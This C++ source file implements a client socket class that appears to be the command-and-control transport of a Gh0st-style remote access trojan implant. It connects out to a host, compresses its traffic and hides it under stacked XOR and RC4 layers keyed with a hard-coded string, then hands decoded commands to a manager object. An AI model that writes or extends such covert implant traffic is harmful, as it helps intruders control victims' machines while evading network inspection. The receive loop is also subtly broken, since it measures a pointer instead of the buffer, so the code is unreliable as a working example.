// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////
#include "ClientSocket.h"
#include "../common/zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"
#pragma comment(lib, "ws2_32.lib")
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
// 加密数据
char* EncryptData(char* data, int len)
{
	WORD AddTable[] = {
		'x','c'
	};
	WORD TableSize = sizeof(AddTable) / sizeof(WORD);
	WORD iCount = 0;

	for (int i = 0; i < len; i++)
	{
		if (iCount == TableSize)
			iCount = 0;

		data[i] ^= AddTable[iCount];
		data[i] -= 0x86;

		iCount++;
	}
	return data;
}

//解密数据
char* miyao_suiji(char* data, int len)
{
	WORD AddTable[] = {
		'x','c'
	};
	WORD TableSize = sizeof(AddTable) / sizeof(WORD);
	WORD iCount = 0;
	for (int i = 0; i < len; i++)
	{
		if (TableSize == iCount)
			iCount = 0;

		data[i] += 0x86;
		data[i] ^= AddTable[iCount];

		iCount++;
	}

	return data;
}
CClientSocket::CClientSocket()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = { 'l','a','s','s',' ' };
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
	char name[] = { 'I',' ','L','o','v','e',' ','Y','o','u',0 };
	rc4_init(m_strkey, (unsigned char*)name, strlen(name));  //初始化 RC4密码
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();
	if (m_hWorkerThread != NULL)
		CloseHandle(m_hWorkerThread);
	if (m_hEvent != NULL)
		CloseHandle(m_hEvent);
	WSACleanup();
}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;

	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	hostent* pHostent = NULL;

	pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;

	ClientAddr.sin_port = htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
		return false;


	const BOOL chOpt = 1; // True
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char*)&chOpt, sizeof(chOpt)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		WSAIoctl
		(
			m_Socket,
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long*)&chOpt,
			0,
			NULL
		);
	}

	m_bIsRunning = true;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
{
	CClientSocket* pThis = (CClientSocket*)lparam;
	//接收的缓冲区
	char* buff = (char*)LocalAlloc(LPTR, MAX_RECV_BUFFER);

	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}
			else
			{
				miyao_suiji(buff, nSize);
				pThis->OnRead((LPBYTE)buff, nSize);
			}

		}
	}

	LocalFree(buff);
	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();
			return;
		}
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer + 4, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);

		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			

			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(4), sizeof(bPacketFlag));

			// 			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			// 				throw "bad buffer";

			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(0), sizeof(int));


			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

				// 				if (pData == NULL || pDeCompressionData == NULL)
				// 					throw "bad Allocate";
				// 
				m_CompressionBuffer.Read(pData, nCompressLength);
				unsigned char Sbox[256] = { 0 };
				memcpy(Sbox, m_strkey, sizeof(m_strkey));
				rc4_crypt(Sbox, (unsigned char*)pData, nCompressLength);//RC4解密读取
				encryption(pData, nCompressLength); //jiemi
				//////////////////////////////////////////////////////////////////////////
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
				// 				else
				// 					throw "bad buffer";

				delete[] pData;
				delete[] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch (...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}

}

void CClientSocket::Disconnect()
{
	//
	// If we're supposed to abort the connection, set the linger value
	// on the socket to 0.
	//
	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char*)&lingerStruct, sizeof(lingerStruct));

	CancelIo((HANDLE)m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	m_Socket = INVALID_SOCKET;

	SetEvent(m_hEvent);
}


void CClientSocket::rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{

	int i = 0, j = 0, k[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = key[i % Len];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];     //交换s[i]和s[j]
		s[j] = tmp;
	}

}
void CClientSocket::rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len)
{
	
	int x = 0, y = 0, t = 0;
	unsigned char tmp;
	unsigned long i;
	for (i = 0; i < Len; i++)
	{
		x = (x + 1) % 256;
		y = (y + s[x]) % 256;
		tmp = s[x];
		s[x] = s[y];     //交换s[x]和s[y]
		s[y] = tmp;
		t = (s[x] + s[y]) % 256;
		Data[i] ^= s[t];
	}
}
void CClientSocket::encryption(LPBYTE szData, unsigned long Size)
{
	
	//该数组用来异或
	WORD AddTable[] = {
		1,9,9,6,1,9,9,5
	};
	WORD TableSize = sizeof(AddTable) / sizeof(WORD);
	WORD iCount = 0;
	unsigned long To = Size / 3;
	for (unsigned long i = 0; i < To; i++)
	{
		if (iCount == TableSize)
			iCount = 0;

		szData[i] ^= AddTable[iCount];
		iCount++;
	}
}

int CClientSocket::Send(LPBYTE lpData, UINT nSize)
{

	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001 + 12;
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		int	nRet = compress(pDest, &destLen, lpData, nSize);

		if (nRet != Z_OK)
		{
			delete[] pDest;
			return -1;
		}


		encryption(pDest, destLen); //jiami
		unsigned char Sbox[256] = { 0 };
		memcpy(Sbox, m_strkey, sizeof(m_strkey));
		rc4_crypt(Sbox, (unsigned char*)pDest, destLen);//RC4加密发送

		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete[] pDest;
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete[] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}
	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)//修改的
{

	EncryptData((char*)lpData, nSize);

	int nRet = 0;
	const char* pbuf = (char*)lpData;
	int size = 0;
	int nSend = 0;
	int nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		BOOL bErrorOccurred = TRUE;

		int i = 0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);

			if (nRet > 0)
			{
				bErrorOccurred = FALSE;

				break;
			}
			else
			{
				Sleep(100);
			}
		}

		if (bErrorOccurred == TRUE)
		{
			return -1;
		}

		nSend += nRet;
		pbuf += nSplitSize;

		Sleep(10); // 必要的Sleep,过快会导致CPU使用率过高
	}

	// 发送最后的部分
	if (size > 0)
	{
		BOOL bErrorOccurred = TRUE;

		int i = 0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char*)pbuf, size, 0);

			if (nRet > 0)
			{
				bErrorOccurred = FALSE;

				break;
			}
			else
			{
				Sleep(100);
			}
		}

		if (bErrorOccurred == TRUE)
		{
			return -1;
		}

		nSend += nRet;
	}

	if (nSend == nSize)
	{
		return nSend;
	}

	return SOCKET_ERROR;
}



void CClientSocket::setManagerCallBack(CManager* pManager)
{
	m_pManager = pManager;
}